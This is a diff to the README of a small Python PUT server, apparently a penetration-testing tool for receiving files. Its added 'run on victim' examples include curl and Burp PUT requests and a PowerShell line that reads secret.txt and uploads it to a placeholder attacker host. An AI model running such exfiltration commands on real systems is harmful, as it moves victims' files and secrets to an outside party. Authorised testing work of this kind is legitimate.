@@ -1,12 +1,31 @@
 Start the server
 ------------------------
 ```bash
-python script-name.py <ip-address> <port>
+python simple-python-put-server.py <ip-address> <port>
 ```
-generate server.xml with the following command:
+Example usages (run on victim)
 ------------------------
-```bash
-openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
+```
+curl
+---
+curl -X PUT --upload-file test.txt http://<ip-address>:<port>
+
+Burp
+PUT /hello.txt HTTP/1.1
+Host: <ip-address>
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Content-Length: 19
+Upgrade-Insecure-Requests: 1
+
+sdokajsldfkhfsdfdf
+
+powershell
+$body = Get-Content secret.txt
+Invoke-RestMethod -Uri http://ip:port/secret.txt -Method PUT -Body $body
 ```
 Script
 ------------------------
